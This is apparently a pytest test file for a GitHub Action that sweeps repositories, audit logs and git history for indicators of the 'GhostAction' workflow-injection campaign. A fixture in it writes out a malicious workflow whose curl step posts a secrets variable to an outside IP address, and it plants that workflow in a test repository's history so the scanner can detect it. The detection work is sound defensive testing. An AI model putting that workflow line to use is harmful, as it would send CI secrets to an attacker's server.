import json
import subprocess
import sys
from datetime import datetime, timezone
from pathlib import Path

import pytest

ACTION = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ACTION / "src"))

import sweep  # noqa: E402

BUNDLED = str(ACTION / "iocs" / "ghostaction.json")
PAYLOAD = (
    "name: Github Actions Security\n"
    "on: push\n"
    "jobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n"
    "      - run: curl -X POST http://193.32.204.199:3000/api/workflow/receive -d \"$S\"\n"
)


def git(cwd, *args):
    subprocess.run(["git", *args], cwd=cwd, check=True, capture_output=True,
                   env={"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@t", "GIT_COMMITTER_NAME": "t",
                        "GIT_COMMITTER_EMAIL": "t@t", "HOME": str(cwd), "PATH": "/usr/bin:/bin"})


def make_repo(root: Path, name: str, infected: bool) -> Path:
    src = root / "src" / name
    src.mkdir(parents=True)
    git(src, "init", "-q", "-b", "main")
    (src / ".github" / "workflows").mkdir(parents=True)
    (src / ".github" / "workflows" / "ci.yaml").write_text("name: CI\non: push\n")
    git(src, "add", ".")
    git(src, "commit", "-q", "-m", "init")
    if infected:
        # Payload pushed to a side branch, then removed: only history shows it.
        git(src, "checkout", "-q", "-b", "feature")
        (src / ".github" / "workflows" / "github_actions_security.yml").write_text(PAYLOAD)
        git(src, "add", ".")
        git(src, "commit", "-q", "-m", "Add Github Actions Security workflow")
        git(src, "rm", "-q", ".github/workflows/github_actions_security.yml")
        git(src, "commit", "-q", "-m", "cleanup")
        git(src, "checkout", "-q", "main")
    bare = root / "remote" / "o" / f"{name}.git"
    bare.parent.mkdir(parents=True, exist_ok=True)
    git(root, "clone", "-q", "--bare", str(src), str(bare))
    return bare


class FakeGitHub:
    token = "ghs_secret_token_value"

    def __init__(self, repos, workflows=None, audit=None, fail=()):
        self._repos, self._workflows, self._audit, self._fail = repos, workflows or {}, audit or {}, set(fail)

    def repos(self, owner):
        if ("repos", owner) in self._fail:
            raise sweep.SweepError("gh api exited 1: HTTP 403")
        return self._repos.get(owner, [])

    def workflows(self, repo):
        if ("workflows", repo) in self._fail:
            raise sweep.SweepError("gh api exited 1: gh: Not Found (HTTP 404)")
        return self._workflows.get(repo, [])

    def audit_runs(self, owner, day):
        if ("audit", owner) in self._fail:
            raise sweep.SweepError("gh api exited 1: HTTP 500")
        return self._audit.get((owner, day), [])


@pytest.fixture
def iocs():
    return sweep.load_iocs([BUNDLED])


# --- indicator data and matchers -----------------------------------------------


def test_bundled_iocs_cover_the_ghostaction_campaign(iocs):
    assert iocs.campaigns == ("GhostAction",)
    assert "github_actions_security.yml" in iocs.workflow_files
    assert iocs.endpoint_re.search("http://193.32.204.199:3000")


def test_workflow_file_match_ignores_case_and_yaml_extension(iocs):
    assert sweep.is_workflow_file(".github/workflows/Security-Audit.yaml", iocs)
    assert not sweep.is_workflow_file("docs/security-audit.yml", iocs)
    assert not sweep.is_workflow_file(".github/workflows/security-suite.yml", iocs)


def test_names_and_subjects_match_exactly_not_fuzzily(iocs):
    assert sweep.is_workflow_name("github actions  SECURITY", iocs)
    assert not sweep.is_workflow_name("Security Suite (Pulse + CodeQL)", iocs)
    assert not sweep.is_workflow_name(None, iocs)
    assert sweep.is_commit_message("Add security check workflow", iocs)
    assert not sweep.is_commit_message("Add security check workflow for docs", iocs)


def test_endpoint_dots_are_literal(iocs):
    assert sweep.endpoint_hits("x carte-avantage.com y", iocs) == ["carte-avantage.com"]
    assert sweep.endpoint_hits("193x32x204x199", iocs) == []


def test_load_iocs_merges_files_and_takes_earliest_since(tmp_path):
    extra = tmp_path / "extra.json"
    extra.write_text(json.dumps({"campaign": "Other", "history_since": "2024-01-01",
                                 "workflow_names": ["Evil"], "endpoints": ["evil.example"]}))
    merged = sweep.load_iocs([BUNDLED, str(extra)])
    assert merged.campaigns == ("GhostAction", "Other")
    assert merged.history_since == "2024-01-01"
    assert sweep.is_workflow_name("evil", merged)
    assert sweep.endpoint_hits("evil.example", merged) == ["evil.example"]


# --- registry and audit checks -------------------------------------------------


def test_registry_flags_deleted_workflow_by_path(iocs):
    wfs = [{"id": 1, "name": "CI", "path": ".github/workflows/ci.yaml", "state": "active"},
           {"id": 2, "name": "x", "path": ".github/workflows/security-check.yml", "state": "deleted"}]
    found = sweep.check_registry("o/r", wfs, iocs)
    assert [f["workflow_id"] for f in found] == [2]


def test_audit_flags_runs_by_workflow_name(iocs):
    events = [{"name": "Security Audit", "repo": "o/r", "event": "push", "actor": "mallory"},
              {"name": "CI", "repo": "o/r", "event": "push", "actor": "alice"}]
    found = sweep.check_audit("o", events, iocs)
    assert [f["actor"] for f in found] == ["mallory"]


def test_audit_days_counts_back_from_today():
    today = datetime(2026, 10, 15, tzinfo=timezone.utc)
    assert sweep.audit_days(today, 3) == ["2026-10-15", "2026-10-14", "2026-10-13"]
    assert sweep.audit_days(today, 0) == []


# --- history scan over real git repositories -----------------------------------


def test_history_finds_payload_removed_from_side_branch(tmp_path, iocs):
    bare = make_repo(tmp_path, "evil", infected=True)
    found = sweep.scan_history("o/evil", str(bare), str(tmp_path / "work"), "2000-01-01", iocs, "")
    checks = sorted({f["check"] for f in found})
    assert checks == ["commit-message", "endpoint", "workflow-file"]
    assert {f["status"] for f in found if f["check"] == "workflow-file"} == {"A", "D"}
    assert not (tmp_path / "work" / "o__evil.git").exists()


def test_history_clean_repo_has_no_findings(tmp_path, iocs):
    bare = make_repo(tmp_path, "clean", infected=False)
    assert sweep.scan_history("o/clean", str(bare), str(tmp_path / "work"), "", iocs, "") == []


def test_history_since_bounds_only_the_endpoint_scan(tmp_path, iocs):
    bare = make_repo(tmp_path, "evil", infected=True)
    found = sweep.scan_history("o/evil", str(bare), str(tmp_path / "work"), "2099-01-01", iocs, "")
    assert "endpoint" not in {f["check"] for f in found}
    assert "workflow-file" in {f["check"] for f in found}


def test_clone_failure_is_an_error_without_the_token(tmp_path, iocs):
    with pytest.raises(sweep.SweepError) as exc:
        sweep.scan_history("o/missing", str(tmp_path / "nope.git"), str(tmp_path / "w"), "", iocs,
                           "ghs_secret_token_value")
    assert "ghs_secret_token_value" not in str(exc.value)


def test_git_env_sends_token_as_header_not_url():
    env = sweep.git_env("tok")
    assert env["GIT_TERMINAL_PROMPT"] == "0"
    assert env["GIT_CONFIG_KEY_0"] == "http.https://github.com/.extraheader"
    assert "tok" not in env["GIT_CONFIG_VALUE_0"]
    assert "GIT_CONFIG_COUNT" not in sweep.git_env("")


def test_redact_removes_token_and_bounds_length():
    assert sweep.redact("fatal: tok was rejected", "tok") == "fatal: *** was rejected"
    assert len(sweep.redact("x" * 2000, "")) == 500


# --- end to end through main() --------------------------------------------------


def run_main(tmp_path, gh, *extra):
    report = tmp_path / "report.json"
    summary = tmp_path / "summary.md"
    code = sweep.main(["--owners", "o", "--report", str(report), "--summary", str(summary),
                       "--clone-url", str(tmp_path / "remote" / "{repo}.git"),
                       "--jobs", "2", *extra], gh=gh)
    return code, json.loads(report.read_text()), summary.read_text()


def test_main_clean_exits_zero(tmp_path, monkeypatch):
    monkeypatch.setenv("GITHUB_OUTPUT", str(tmp_path / "out"))
    make_repo(tmp_path, "clean", infected=False)
    gh = FakeGitHub({"o": [{"full_name": "o/clean", "archived": False}]})
    code, report, summary = run_main(tmp_path, gh, "--audit-days", "2")
    assert code == sweep.EXIT_CLEAN
    assert report["result"] == "clean" and report["repositories"] == 1
    assert "result=clean" in (tmp_path / "out").read_text()
    assert "Workflow IOC sweep: clean" in summary


def test_main_indicator_exits_one_and_skips_archived(tmp_path):
    make_repo(tmp_path, "evil", infected=True)
    make_repo(tmp_path, "clean", infected=False)
    gh = FakeGitHub(
        {"o": [{"full_name": "o/evil", "archived": False}, {"full_name": "o/clean", "archived": True}]},
        audit={},
    )
    code, report, _ = run_main(tmp_path, gh)
    assert code == sweep.EXIT_INDICATOR
    assert report["repositories"] == 1
    assert {f["repo"] for f in report["findings"]} == {"o/evil"}


def test_main_audit_indicator_alone_exits_one(tmp_path):
    make_repo(tmp_path, "clean", infected=False)
    today = datetime.now(timezone.utc).strftime("%Y-%m-%d")
    gh = FakeGitHub({"o": [{"full_name": "o/clean", "archived": False}]},
                    audit={("o", today): [{"name": "Security Check", "repo": "o/clean"}]})
    code, report, _ = run_main(tmp_path, gh, "--audit-days", "1")
    assert code == sweep.EXIT_INDICATOR
    assert report["findings"][0]["check"] == "audit"


def test_main_errors_without_indicator_exit_two(tmp_path):
    make_repo(tmp_path, "clean", infected=False)
    gh = FakeGitHub({"o": [{"full_name": "o/clean", "archived": False},
                           {"full_name": "o/gone", "archived": False}]},
                    fail={("audit", "o")})
    code, report, summary = run_main(tmp_path, gh, "--audit-days", "1")
    assert code == sweep.EXIT_INCOMPLETE
    assert {e["stage"] for e in report["errors"]} == {"history", "audit"}
    assert "Workflow IOC sweep: error" in summary


def test_main_registry_404_is_not_an_error(tmp_path):
    make_repo(tmp_path, "clean", infected=False)
    gh = FakeGitHub({"o": [{"full_name": "o/clean", "archived": False}]},
                    fail={("workflows", "o/clean")})
    code, report, _ = run_main(tmp_path, gh)
    assert code == sweep.EXIT_CLEAN and report["errors"] == []


def test_main_repo_listing_failure_exits_two(tmp_path):
    gh = FakeGitHub({}, fail={("repos", "o")})
    code, report, _ = run_main(tmp_path, gh)
    assert code == sweep.EXIT_INCOMPLETE
    assert report["errors"][0]["stage"] == "list-repos"


def test_main_bad_ioc_file_exits_two(tmp_path, monkeypatch):
    monkeypatch.setenv("GITHUB_OUTPUT", str(tmp_path / "out"))
    bad = tmp_path / "bad.json"
    bad.write_text("{not json")
    code = sweep.main(["--owners", "o", "--iocs", str(bad), "--report", str(tmp_path / "r.json"),
                       "--summary", ""], gh=FakeGitHub({}))
    assert code == sweep.EXIT_INCOMPLETE
    assert "result=error" in (tmp_path / "out").read_text()
